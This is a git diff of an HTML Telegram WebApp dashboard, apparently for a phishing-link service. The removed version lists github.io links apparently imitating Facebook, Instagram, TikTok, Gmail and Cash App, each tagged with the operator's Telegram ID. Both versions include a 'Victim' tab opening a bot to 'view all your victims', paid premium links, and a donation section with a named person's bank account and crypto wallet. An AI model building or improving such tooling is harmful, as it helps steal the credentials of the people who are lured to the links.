@@ -1,145 +1,326 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Web App</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f4f4f9;
-        }
-        
-        header {
-            background: #333;
-            color: white;
-            padding: 15px;
-            text-align: center;
-        }
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Intelligent Verification Linkbot - Telegram WebApp</title>
+<style>
+  /* Reset & basics */
+  body, html {
+    margin:0; padding:0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: #f0f2f5; color:#222;
+    min-height: 100vh;
+    display: flex; flex-direction: column;
+  }
+  a { color:#2962ff; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  h1, h2, h3 { margin: 0.5em 0; }
 
-        nav button {
-            margin: 0 10px;
-            padding: 10px 20px;
-            border: none;
-            cursor: pointer;
-            background-color: #555;
-            color: white;
-            border-radius: 5px;
-        }
+  /* Container for main content */
+  #app {
+    flex-grow: 1;
+    padding: 15px;
+    max-width: 480px;
+    margin: 0 auto;
+    background: white;
+    box-shadow: 0 0 12px rgb(0 0 0 / 0.1);
+    border-radius: 10px;
+  }
 
-        nav button:hover {
-            background-color: #777;
-        }
+  /* Navigation bar */
+  nav {
+    display: flex;
+    justify-content: space-around;
+    background: #fff;
+    border-top: 1px solid #ddd;
+    padding: 10px 0;
+  }
+  nav button {
+    background: none;
+    border: none;
+    color: #555;
+    font-size: 14px;
+    cursor: pointer;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    flex-grow: 1;
+    transition: color 0.3s ease;
+  }
+  nav button svg {
+    width: 24px; height: 24px;
+    margin-bottom: 4px;
+    stroke-width: 2;
+    stroke: currentColor;
+    fill: none;
+  }
+  nav button.active, nav button:hover {
+    color: #2962ff;
+  }
 
-        .content {
-            padding: 20px;
-        }
+  section {
+    display: none;
+  }
+  section.active {
+    display: block;
+  }
 
-        .card {
-            border: 1px solid #ccc;
-            border-radius: 10px;
-            padding: 15px;
-            margin: 10px 0;
-            background: white;
-        }
+  /* Links list styling */
+  .link-card {
+    display: flex;
+    align-items: center;
+    margin-bottom: 15px;
+    padding: 10px;
+    border-radius: 8px;
+    box-shadow: 0 1px 5px rgb(0 0 0 / 0.05);
+    background: #fafafa;
+  }
+  .link-card img {
+    width: 60px;
+    height: 60px;
+    border-radius: 8px;
+    object-fit: cover;
+    margin-right: 15px;
+    border: 1px solid #ddd;
+  }
+  .link-info {
+    flex-grow: 1;
+  }
+  .link-name {
+    font-weight: 600;
+    margin-bottom: 5px;
+    font-size: 16px;
+  }
+  .link-url {
+    font-size: 13px;
+    color: #555;
+    word-break: break-all;
+    user-select: all;
+  }
+  .copy-btn {
+    margin-left: 10px;
+    background-color: #2962ff;
+    color: white;
+    border: none;
+    padding: 7px 12px;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 13px;
+    transition: background-color 0.3s ease;
+  }
+  .copy-btn:hover {
+    background-color: #0039cb;
+  }
 
-        .card img {
-            max-width: 100%;
-            border-radius: 10px;
-        }
-    </style>
+  /* Victim section */
+  #victim button {
+    margin-top: 15px;
+    background: #ff6f61;
+    color: white;
+    border: none;
+    padding: 15px 25px;
+    font-size: 18px;
+    font-weight: 700;
+    border-radius: 12px;
+    cursor: pointer;
+    width: 100%;
+    transition: background-color 0.3s ease;
+  }
+  #victim button:hover {
+    background: #e55344;
+  }
+
+  /* Donate styling */
+  #donate p {
+    margin-bottom: 15px;
+    line-height: 1.5;
+  }
+  #donate .account {
+    font-weight: 700;
+    font-size: 16px;
+    background: #e3f2fd;
+    padding: 12px;
+    border-radius: 8px;
+    word-break: break-all;
+  }
+
+  /* Responsive */
+  @media (max-width: 500px) {
+    #app {
+      margin: 0 10px;
+      border-radius: 0;
+      box-shadow: none;
+    }
+  }
+</style>
 </head>
 <body>
-    <header>
-        <nav>
-            <button onclick="showSection('home')">Home</button>
-            <button onclick="showSection('premium')">Premium Link</button>
-            <button onclick="showSection('victim')">Victim</button>
-            <button onclick="showSection('donate')">Donate</button>
-        </nav>
-    </header>
 
-    <main>
-        <section id="home" class="content">
-            <div class="card">
-                <h3>Link 1</h3>
-                <img src="img1.png" alt="Link 1">
-                <a href="https://rrloaty.github.io/a/face.html?id={telegram-id}" target="_blank">Copy Link</a>
-            </div>
-            <div class="card">
-                <h3>Link 2</h3>
-                <img src="img2.png" alt="Link 2">
-                <a href="https://rrloaty.github.io/a/inst.html?id={telegram-id}" target="_blank">Copy Link</a>
-            </div>
-            <div class="card">
-                <h3>Link 3</h3>
-                <img src="img3.png" alt="Link 3">
-                <a href="https://rrloaty.github.io/a/tiktok.html?id={telegram-id}" target="_blank">Copy Link</a>
-            </div>
-            <div class="card">
-                <h3>Link 4</h3>
-                <img src="img4.png" alt="Link 4">
-                <a href="https://rrloaty.github.io/a/gma.html?id={telegram-id}" target="_blank">Copy Link</a>
-            </div>
-            <div class="card">
-                <h3>Link 5</h3>
-                <img src="img5.png" alt="Link 5">
-                <a href="https://rrloaty.github.io/a/tiktok.html?id={telegram-id}" target="_blank">Copy Link</a>
-            </div>
-            <div class="card">
-                <h3>Link 6</h3>
-                <img src="img6.png" alt="Link 6">
-                <a href="https://rrloaty.github.io/a/cash.html?id={telegram-id}" target="_blank">Copy Link</a>
-            </div>
-            <div>
-                <textarea placeholder="Add more links..." rows="4"></textarea>
-                <button>Add Link</button>
-            </div>
-        </section>
+<div id="app">
+  <!-- Home Section -->
+  <section id="home" class="active" aria-label="Home section">
+    <h1>Home Section</h1>
+    <div id="home-links"></div>
+  </section>
 
-        <section id="premium" class="content" style="display:none;">
-            <div class="card">
-                <h3>Premium 1</h3>
-                <img src="premium1.png" alt="Premium 1">
-                <p>Go premium to view or copy this link!</p>
-                <a href="https://t.me/inamyophisintlinkbot">Message for Premium</a>
-            </div>
-            <div class="card">
-                <h3>Premium 2</h3>
-                <img src="premium2.png" alt="Premium 2">
-                <p>Go premium to view or copy this link!</p>
-                <a href="https://t.me/inamyophisintlinkbot">Message for Premium</a>
-            </div>
-        </section>
+  <!-- Premium Section -->
+  <section id="premium" aria-label="Premium links section">
+    <h1>Premium Section</h1>
+    <div id="premium-links"></div>
+  </section>
 
-        <section id="victim" class="content" style="display:none;">
-            <h2>View Your Victims</h2>
-            <p>Open this bot to view all your victims:</p>
-            <a href="https://t.me/intelligentverificationlinkbot" target="_blank">Open Bot</a>
-        </section>
+  <!-- Victim Section -->
+  <section id="victim" aria-label="Victim section">
+    <h2>Open this bot to view all your victims</h2>
+    <button id="open-victim-bot">👉 Open Bot</button>
+  </section>
 
-        <section id="donate" class="content" style="display:none;">
-            <h2>Support Us</h2>
-            <p>Your donations help us promote our links and maintain the service.</p>
-            <p>Donate via: <strong>Opay Bank</strong> - 9114301708, Olatunji Abdumalik Ayomide</p>
-            <p>For non-Nigerians, send donations to BNB, USDT or any BEP20 address: <strong>0xbBcc409872bC2441400735624638F3D67DAa7C4C </strong></p>
-        </section>
-    </main>
+  <!-- Donate Section -->
+  <section id="donate" aria-label="Donate section">
+    <h2>Support Us with Donations</h2>
+    <p>To promote our links and maintain servers and domain names, please consider donating.</p>
+    <p>If you are in Nigeria, send donations to:</p>
+    <div class="account">9114301708<br/>Opay Bank<br/>Olatunji Abdumalik Ayomide</div>
+    <p>If you are outside Nigeria, send your donations to the following crypto address:</p>
+    <div class="account">BNB/USDT/BEP20:<br/>0xbBcc409872bC2441400735624638F3D67DAa7C4C</div>
+  </section>
+</div>
 
-    <script>
-        function showSection(section) {
-            const sections = document.querySelectorAll('.content');
-            sections.forEach(sec => {
-                sec.style.display = 'none'; // Hide all sections
-            });
-            document.getElementById(section).style.display = 'block'; // Show the selected section
-        }
+<!-- Navigation -->
+<nav aria-label="Primary navigation">
+  <button id="nav-home" class="active" aria-controls="home" aria-selected="true" role="tab">
+    <svg viewBox="0 0 24 24" stroke="currentColor" fill="none"><path d="M3 12L12 3l9 9v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-9z"/></svg>
+    Home
+  </button>
+  <button id="nav-premium" aria-controls="premium" aria-selected="false" role="tab">
+    <svg viewBox="0 0 24 24" stroke="currentColor" fill="none"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+    Premium
+  </button>
+  <button id="nav-victim" aria-controls="victim" aria-selected="false" role="tab">
+    <svg viewBox="0 0 24 24" stroke="currentColor" fill="none"><circle cx="12" cy="7" r="4"/><path d="M5.5 21a7 7 0 0 1 13 0"/></svg>
+    Victim
+  </button>
+  <button id="nav-donate" aria-controls="donate" aria-selected="false" role="tab">
+    <svg viewBox="0 0 24 24" stroke="currentColor" fill="none"><path d="M12 1v22m-7-7h14"/></svg>
+    Donate
+  </button>
+</nav>
 
-        // Call to show home section by default
-        showSection('home');
-    </script>
+<script>
+  // Initialize Telegram WebApp safely
+  const tg = window.Telegram?.WebApp;
+  if (tg) tg.expand();
+
+  // Get Telegram User ID or default
+  const telegramId = tg?.initDataUnsafe?.user?.id || "unknown_user";
+
+  // Sample links data with images and URLs
+  const homeLinksData = [
+    { name: "Example Link 1", image: "https://via.placeholder.com/60", url: "https://example.com/link1" },
+    { name: "Example Link 2", image: "https://via.placeholder.com/60", url: "https://example.com/link2" }
+  ];
+
+  const premiumLinksData = [
+    { name: "Premium Link 1", image: "https://via.placeholder.com/60", url: "https://premium.com/link1" },
+    { name: "Premium Link 2", image: "https://via.placeholder.com/60", url: "https://premium.com/link2" }
+  ];
+
+  // Build link cards in given section with Telegram ID appended
+  function buildLinks(sectionId, linksData) {
+    const container = document.getElementById(sectionId + "-links");
+    container.innerHTML = "";
+
+    if (linksData.length === 0) {
+      container.innerHTML = "<p>No links available.</p>";
+      return;
+    }
+
+    linksData.forEach(link => {
+      let url;
+      try {
+        url = new URL(link.url);
+      } catch (e) {
+        console.error("Invalid URL:", link.url);
+        return;
+      }
+      if (telegramId !== "unknown_user") {
+        url.searchParams.set("userid", telegramId);
+      }
+
+      const card = document.createElement("div");
+      card.className = "link-card";
+
+      const img = document.createElement("img");
+      img.src = link.image;
+      img.alt = link.name;
+
+      const info = document.createElement("div");
+      info.className = "link-info";
+
+      const name = document.createElement("div");
+      name.className = "link-name";
+      name.textContent = link.name;
+
+      const linkEl = document.createElement("a");
+      linkEl.className = "link-url";
+      linkEl.href = url.toString();
+      linkEl.textContent = url.toString();
+      linkEl.target = "_blank";
+      linkEl.rel = "noopener noreferrer";
+
+      const copyBtn = document.createElement("button");
+      copyBtn.className = "copy-btn";
+      copyBtn.textContent = "Copy";
+      copyBtn.addEventListener("click", () => {
+        navigator.clipboard.writeText(url.toString()).then(() => {
+          copyBtn.textContent = "Copied!";
+          setTimeout(() => { copyBtn.textContent = "Copy"; }, 1500);
+        });
+      });
+
+      info.appendChild(name);
+      info.appendChild(linkEl);
+
+      card.appendChild(img);
+      card.appendChild(info);
+      card.appendChild(copyBtn);
+
+      container.appendChild(card);
+    });
+  }
+
+  // Initial build of links on page load
+  buildLinks("home", homeLinksData);
+  buildLinks("premium", premiumLinksData);
+
+  // Navigation buttons switching sections
+  const navButtons = document.querySelectorAll("nav button");
+  navButtons.forEach(btn => {
+    btn.addEventListener("click", () => {
+      navButtons.forEach(b => {
+        b.classList.remove("active");
+        const sec = document.getElementById(b.getAttribute("aria-controls"));
+        if (sec) sec.classList.remove("active");
+        b.setAttribute("aria-selected", "false");
+      });
+
+      btn.classList.add("active");
+      btn.setAttribute("aria-selected", "true");
+      const targetId = btn.getAttribute("aria-controls");
+      const targetSection = document.getElementById(targetId);
+      if (targetSection) targetSection.classList.add("active");
+    });
+  });
+
+  // Open victim bot button action
+  const victimBtn = document.getElementById("open-victim-bot");
+  if (victimBtn) {
+    victimBtn.addEventListener("click", () => {
+      const victimBotUsername = "intelligentvictimbot";
+      window.open(`https://t.me/${victimBotUsername}`, "_blank");
+    });
+  }
+</script>
+
 </body>
 </html>
